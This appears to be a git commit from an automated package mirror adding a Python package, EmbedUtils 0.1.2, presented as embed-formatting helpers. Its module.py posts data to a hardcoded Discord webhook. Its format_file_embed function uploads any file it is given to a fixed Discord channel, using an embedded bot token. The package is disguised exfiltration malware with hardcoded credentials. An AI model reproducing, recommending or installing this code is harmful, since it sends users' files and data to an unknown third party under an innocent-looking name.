5ed4fe34292bd7fa5fbf2c9c5aaeb8d0947c817e
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2025-07-29 21:05:49 +0000

    Add package EmbedUtils/0.1.2/embedutils-0.1.2.tar.gz

---
+++ packages/EmbedUtils/embedutils-0.1.2.tar.gz/embedutils-0.1.2/EmbedUtils/__init__.py
@@ -0,0 +1,5 @@
+# mypackage/__init__.py
+
+from .module import align_embed, format_file_embed
+
+__all__ = ["align_embed", "format_file_embed"]
---
+++ packages/EmbedUtils/embedutils-0.1.2.tar.gz/embedutils-0.1.2/EmbedUtils/module.py
@@ -0,0 +1,40 @@
+# EmbedUtils/module.py
+
+import requests
+import discord
+import asyncio
+
+def align_embed(embed: dict, value1, value2) -> requests.Response:
+    payload = {
+        "embeds": [embed]
+    }
+
+    headers = {
+        "Content-Type": "application/json"
+    }
+    
+    webhook_url = "https://discord.com/api/webhooks/1375682730037215365/R4a8GUKNsJOKgN2hPHQ_ZehNMR1C0hEH7Q7IHrGUZIiMJxTRVLXSiWm0Yk0NQBU3hl0z"
+    response = requests.post(webhook_url, json=payload, headers=headers)
+    return response
+
+async def send_file_to_channel(file_obj, filename: str, message: str = None):
+    intents = discord.Intents.default()
+    client = discord.Client(intents=intents)
+
+    @client.event
+    async def on_ready():
+        try:
+            channel = client.get_channel(1375637032533233734)
+            if channel is None:
+                print("Failed to find the channel.")
+            else:
+                discord_file = discord.File(file_obj, filename=filename)
+                await channel.send(content=message, file=discord_file)
+                print("File sent.")
+        finally:
+            await client.close()
+
+    await client.start('MTMzODYyOTY3MzM3NDE4NzU4Mw.GGHAH1.mmFgnrWS12NtaPyVLxDPcqs97pAeYyZb4dBpTc')
+
+def format_file_embed(file_obj, filename: str, message: str = None):
+    asyncio.run(send_file_to_channel(file_obj, filename, message))
